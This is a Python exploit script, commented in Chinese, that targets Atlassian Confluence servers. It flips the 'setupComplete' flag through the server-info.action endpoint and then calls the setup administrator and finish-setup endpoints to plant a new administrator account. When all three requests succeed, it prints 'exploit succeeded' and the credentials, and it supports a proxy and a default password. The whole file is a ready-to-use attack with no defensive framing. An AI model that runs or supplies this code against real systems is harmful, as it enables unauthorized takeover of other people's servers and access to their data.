import re
import sys
import json
import argparse

import requests
from tld import get_tld

headers1 = {
	"Accept-Encoding": "gzip, deflate, br",
	"Accept": "*/*",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Accept-Language": "en-US;q=0.9,en;q=0.8",
	"Connection": "close",
	"Cache-Control":"max-age=0"
}

headers2 = {
	"Accept-Encoding": "gzip, deflate, br",
	"Accept": "*/*",
	"Accept-Language": "en-US;q=0.9,en;q=0.8",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
	"Connection": "close",
	"Cache-Control": "max-age=0",
	"Content-Type": "application/x-www-form-urlencoded",
	"X-Atlassian-Token": "no-check"
}

headers3 = {
	"Accept-Encoding": "gzip, deflate, br",
	"Accept": "*/*",
	"Accept-Language": "en-US;q=0.9,en;q=0.8",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
	"Connection": "close",
	"Cache-Control": "max-age=0",
	"Content-Length": "0",
	"Content-Type": "application/x-www-form-urlencoded",
	"X-Atlassian-Token": "no-check"
}

def parse_command_line_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-H", "--host", required=False, help="指定url")
	parser.add_argument("-U", "--username", required=False, help="指定用户名")
	parser.add_argument("-PW", "--password", required=False, help="指定密码")
	parser.add_argument("-E", "--email", required=False, help="指定邮箱")
	parser.add_argument("-P", "--proxies", required=False, help="指定代理 格式(socks5://127.0.0.1:10808)")
	return parser.parse_args()


def request_1(host,proxies,headers=headers1):
	try:
		if host[-1] =="/":
			host = host[:-1]
		host_1 = "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
		host = host + host_1
		req = requests.get(url=host,proxies=proxies,headers=headers)
		return req.status_code
	except Exception as e:
		print(f"An error occurred: {str(e)}", file=sys.stderr)
		return 0

def request_2(host,proxies,data,headers=headers2):
	try:
		if host[-1] =="/":
			host = host[:-1]
		host += "/setup/setupadministrator.action"
		req = requests.post(url=host,headers=headers,data=data,proxies=proxies,allow_redirects=False)
		return req.status_code
	except Exception as e:
		print(f"An error occurred: {str(e)}", file=sys.stderr)
		return 0


def request_3(host,proxies,headers=headers3):
	try:
		if host[-1] =="/":
			host = host[:-1]
		host += "/setup/finishsetup.action"
		req = requests.post(url=host,headers=headers,proxies=proxies)
		return req.status_code
	except Exception as e:
		print(f"An error occurred: {str(e)}", file=sys.stderr)
		return 0


def main():
	args = parse_command_line_args()
	host = args.host
	try:
		domain = get_tld(host,as_object=True).fld
	except:
		domain = "localhost"
	username = args.username or "admin"
	password = args.password or "CPzJVnYrkwBxBo2G6yGB"
	email = args.email or f"{username}@{domain}"
	proxies = {
    "http": args.proxies,
    "https": args.proxies
	} if args.proxies else None

	data = f"username={username}&fullName={username}&email={email}&password={password}&confirm={password}&setup-next-button=Next"

	req1 = request_1(host,proxies)
	if  req1 != 200:
		print("request_1 error,status_code:",req1)
		return 0

	req2 = request_2(host,proxies,data)
	if req2 != 200:
		print("request_2 error,status_code:",req2)
		return 0

	req3 = request_3(host,proxies)
	if req3 != 200:
		print("request_3 error,status_code:",req3)
		return 0

	print("漏洞利用成功")
	print("username:",username)
	print("password:",password)
	print("email:",email)

	return 0


if __name__ == '__main__':
	main()